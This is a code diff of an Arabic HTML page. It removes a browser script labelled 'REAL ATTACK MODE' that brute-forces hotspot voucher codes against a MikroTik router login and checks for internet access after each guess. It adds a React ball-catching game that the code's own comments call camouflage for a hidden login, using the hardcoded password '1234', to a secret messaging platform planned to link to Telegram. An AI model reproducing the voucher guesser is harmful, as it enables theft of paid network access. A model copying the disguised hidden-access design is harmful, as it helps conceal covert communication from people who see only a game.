@@ -1,115 +1,170 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>نظام التخمين الحقيقي - Security Lab</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>تحدي صيد الكرات Pro</title>
+    <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
+    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        :root { --neon: #00ff41; --dark: #050505; }
-        body { background-color: var(--dark); color: white; font-family: 'Courier New', monospace; padding: 20px; display: flex; flex-direction: column; align-items: center; }
-        .panel { border: 1px solid var(--neon); padding: 20px; border-radius: 10px; width: 95%; max-width: 500px; background: rgba(0, 255, 65, 0.02); }
-        input, select { width: 100%; padding: 12px; margin: 10px 0; background: #111; border: 1px solid #333; color: var(--neon); border-radius: 5px; box-sizing: border-box; }
-        button { width: 100%; padding: 15px; background: var(--neon); color: black; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; }
-        #log { width: 100%; height: 150px; background: #000; border: 1px solid #222; margin-top: 15px; padding: 10px; font-size: 0.8rem; overflow-y: auto; text-align: left; color: #888; }
-        .success-box { border: 2px solid gold; color: gold; padding: 10px; margin-top: 15px; display: none; background: rgba(255, 215, 0, 0.1); }
+        body { margin: 0; overflow: hidden; touch-action: manipulation; }
+        .ball { transition: all 0.2s ease-out; cursor: pointer; }
     </style>
 </head>
-<body>
+<body class="bg-gray-900 text-white font-sans select-none">
 
-    <div class="panel">
-        <h2 style="color: var(--neon); text-align: center;">REAL ATTACK MODE</h2>
-        
-        <label>رابط صفحة دخول الشبكة:</label>
-        <input type="text" id="targetUrl" value="http://192.168.1.1/login">
-        
-        <label>طول الكرت:</label>
-        <input type="number" id="cardLen" value="10">
-        
-        <label>بداية الكرت الثابتة:</label>
-        <input type="text" id="prefix" value="24">
+<div id="root"></div>
 
-        <button id="startBtn" onclick="startRealAttack()">بدء التخمين الحقيقي</button>
+<script type="text/babel">
+    const { useState, useEffect, useRef } = React;
 
-        <div id="log">انتظار الأوامر...</div>
+    // --- المؤثرات الصوتية (روابط مباشرة جاهزة) ---
+    // يمكنك استبدال هذه الروابط بملفات .mp3 خاصة بك لاحقاً
+    const soundUrls = {
+        pop: "https://www.soundjay.com/buttons/sounds/button-10.mp3", // صوت صيد الكرة
+        miss: "https://www.soundjay.com/buttons/sounds/button-11.mp3", // صوت تفويت الكرة
+        fail: "https://www.soundjay.com/communication/sounds/fail-buzzer-02.mp3", // صوت الباسورد الخطأ
+        success: "https://www.soundjay.com/buttons/sounds/button-3.mp3" // صوت الباسورد الصح
+    };
 
-        <div id="successBox" class="success-box">
-            <b>[!] تم العثور على كرت شغال:</b>
-            <div id="validCard" style="font-size: 1.5rem; margin-top: 5px;"></div>
-        </div>
-    </div>
+    const GameApp = () => {
+        const [gameState, setGameState] = useState('playing'); // playing, login, chatting
+        const [score, setScore] = useState(0);
+        const [ballPosition, setBallPosition] = useState({ top: 50, left: 50 });
+        const [password, setPassword] = useState('');
+        const [loginError, setLoginError] = useState('');
+        const audioRefs = useRef({});
 
-    <script>
-        let isRunning = false;
+        // تحميل الأصوات عند بدء التطبيق
+        useEffect(() => {
+            Object.keys(soundUrls).forEach(key => {
+                audioRefs.current[key] = new Audio(soundUrls[key]);
+                audioRefs.current[key].load();
+            });
+        }, []);
 
-        async function startRealAttack() {
-            const url = document.getElementById('targetUrl').value;
-            const len = document.getElementById('cardLen').value;
-            const pre = document.getElementById('prefix').value;
-            const log = document.getElementById('log');
-            const btn = document.getElementById('startBtn');
+        const playSound = (soundName) => {
+            if (audioRefs.current[soundName]) {
+                audioRefs.current[soundName].currentTime = 0; // إعادة الصوت من البداية
+                audioRefs.current[soundName].play().catch(e => console.log("Sound play blocked: ", e));
+            }
+        };
 
-            if(isRunning) { isRunning = false; btn.innerText = "بدء التخمين الحقيقي"; return; }
-            
-            isRunning = true;
-            btn.innerText = "إيقاف الهجوم";
-            log.innerHTML = "[+] بدء الاتصال بالشبكة...<br>";
+        const moveBall = () => {
+            // تحريك الكرة لمكان عشوائي (تجنب الزاوية اليسرى العليا قليلاً)
+            const newTop = Math.random() * 80 + 10; // بين 10% و 90%
+            const newLeft = Math.random() * 80 + 10;
+            setBallPosition({ top: newTop, left: newLeft });
+        };
 
-            while(isRunning) {
-                // 1. توليد كرت عشوائي حقيقي بناءً على مدخلاتك
-                let attempt = pre;
-                for(let i=0; i < (len - pre.length); i++) attempt += Math.floor(Math.random()*10);
+        const handleBallClick = () => {
+            if (gameState !== 'playing') return;
+            playSound('pop');
+            setScore(prev => prev + 10);
+            moveBall();
+        };
 
-                log.innerHTML += `> تجربة الكرت: ${attempt}... `;
-                log.scrollTop = log.scrollHeight;
+        // تفعيل اللعبة بالتحريك التلقائي كل فترة
+        useEffect(() => {
+            if (gameState !== 'playing') return;
+            const timer = setInterval(() => {
+                // playSound('miss'); // اختياري: تشغيل صوت إذا فاتتك الكرة
+                moveBall();
+            }, 1200); // تغيير السرعة من هنا
+            return () => clearInterval(timer);
+        }, [gameState]);
 
-                try {
-                    // 2. محاولة إرسال الكرت للمايكروتك
-                    // نستخدم mode: 'no-cors' لمحاولة تخطي حماية المتصفح
-                    const controller = new AbortController();
-                    const timeoutId = setTimeout(() => controller.abort(), 2000);
+        // --- التعامل مع الزر المخفي والباسورد ---
+        const handleSecretTrigger = () => {
+            setGameState('login');
+            setPassword('');
+            setLoginError('');
+        };
 
-                    await fetch(`${url}?username=${attempt}&password=${attempt}`, {
-                        method: 'GET',
-                        mode: 'no-cors',
-                        signal: controller.signal
-                    });
+        const handleLogin = () => {
+            if (password === '1234') { // *** الباسورد السري هنا (غيّره لاحقاً) ***
+                playSound('success');
+                setGameState('chatting');
+            } else {
+                playSound('fail');
+                setLoginError('كلمة المرور غير صحيحة!');
+                setTimeout(() => setLoginError(''), 2000);
+            }
+        };
 
-                    // 3. فحص هل تم فتح الإنترنت؟
-                    const isOnline = await checkInternet();
-                    
-                    if(isOnline) {
-                        log.innerHTML += "<span style='color:gold'>[نجاح!]</span><br>";
-                        showSuccess(attempt);
-                        isRunning = false;
-                        btn.innerText = "بدء التخمين الحقيقي";
-                        break;
-                    } else {
-                        log.innerHTML += "<span style='color:red'>[فشل]</span><br>";
-                    }
-
-                } catch (e) {
-                    log.innerHTML += "<span style='color:orange'>[خطأ في الشبكة]</span><br>";
-                }
+        return (
+            <div className="relative h-screen w-screen p-4 overflow-hidden">
                 
-                // سرعة التخمين (تعديل هذا الرقم يغير السرعة)
-                await new Promise(r => setTimeout(r, 500)); 
-            }
-        }
+                {/* --- 1. الزر المخفي (في الزاوية اليسرى العليا) --- */}
+                <div 
+                    onClick={handleSecretTrigger} 
+                    className="absolute top-0 left-0 w-16 h-16 bg-red-500 opacity-0 active:opacity-20 cursor-pointer z-50"
+                    title="المنطقة السرية"
+                ></div>
 
-        async function checkInternet() {
-            try {
-                // محاولة الاتصال بموقع خارجي للتأكد أن الإنترنت فُتح
-                const online = await fetch("https://www.google.com/favicon.ico", { mode: 'no-cors' });
-                return true;
-            } catch (e) {
-                return false;
-            }
-        }
+                {/* --- 2. واجهة اللعبة (التمويه) --- */}
+                {gameState === 'playing' && (
+                    <div className="h-full flex flex-col items-center">
+                        <header className="w-full flex justify-between items-center mb-8 pb-4 border-b border-gray-700">
+                            <h1 className="text-xl font-bold text-yellow-400">تحدي صيد الكرات Pro</h1>
+                            <div className="bg-gray-800 p-2 px-4 rounded-full">النقاط: <span className="text-green-400 font-mono text-xl">{score}</span></div>
+                        </header>
+                        
+                        <div className="relative flex-grow w-full bg-gray-800 rounded-lg shadow-inner overflow-hidden border border-gray-700">
+                            <div 
+                                onClick={handleBallClick}
+                                className="ball absolute w-12 h-12 bg-red-500 rounded-full shadow-lg border-4 border-white"
+                                style={{ top: `${ballPosition.top}%`, left: `${ballPosition.left}%` }}
+                            ></div>
+                        </div>
+                    </div>
+                )}
 
-        function showSuccess(card) {
-            const box = document.getElementById('successBox');
-            document.getElementById('validCard').innerText = card;
-            box.style.display = 'block';
-        }
-    </script>
+                {/* --- 3. نافذة الباسورد المخفية --- */}
+                {gameState === 'login' && (
+                    <div className="absolute inset-0 bg-black/90 flex flex-col items-center justify-center z-40 p-6 backdrop-blur-sm">
+                        <div className="bg-gray-800 p-8 rounded-2xl shadow-2xl border border-gray-700 w-full max-w-sm text-center">
+                            <h2 className="text-3xl font-extrabold mb-8 text-yellow-300">النظام السري</h2>
+                            {loginError && <p className="text-red-400 mb-4 font-bold">{loginError}</p>}
+                            <input 
+                                type="password" 
+                                value={password}
+                                onChange={(e) => setPassword(e.target.value)}
+                                placeholder="أدخل كود الدخول"
+                                className="w-full p-4 mb-6 bg-gray-900 rounded-lg border border-gray-600 text-center text-2xl font-mono tracking-widest text-white focus:ring-2 focus:ring-yellow-400 focus:outline-none"
+                                maxLength={4}
+                            />
+                            <div className="flex gap-4">
+                                <button onClick={() => setGameState('playing')} className="w-1/2 p-3 bg-gray-700 rounded-lg text-gray-300 font-bold hover:bg-gray-600 transition">إلغاء</button>
+                                <button onClick={handleLogin} className="w-1/2 p-3 bg-yellow-500 rounded-lg text-gray-900 font-bold hover:bg-yellow-400 transition">دخول</button>
+                            </div>
+                        </div>
+                    </div>
+                )}
+
+                {/* --- 4. واجهة المنصة السرية (قيد الإنشاء) --- */}
+                {gameState === 'chatting' && (
+                    <div className="h-full flex flex-col items-center justify-center bg-gray-950 p-6 text-center">
+                        <h1 className="text-4xl font-extrabold text-green-400 mb-6">تم الدخول بنجاح! ✅</h1>
+                        <p className="text-xl text-gray-300 mb-10">هذه هي واجهة المنصة السرية (قيد الإنشاء).</p>
+                        <p className="text-lg text-gray-400 mb-10">في الخطوة القادمة، سنربطها بتليجرام لإرسال واستقبال الرسائل.</p>
+                        <button 
+                            onClick={() => setGameState('playing')} 
+                            className="p-4 px-8 bg-red-600 rounded-full font-bold text-lg hover:bg-red-500 transition shadow-lg"
+                        >
+                            خروج وإعادة قفل
+                        </button>
+                    </div>
+                )}
+
+            </div>
+        );
+    };
+
+    const root = ReactDOM.createRoot(document.getElementById('root'));
+    root.render(<GameApp />);
+</script>
 </body>
 </html>
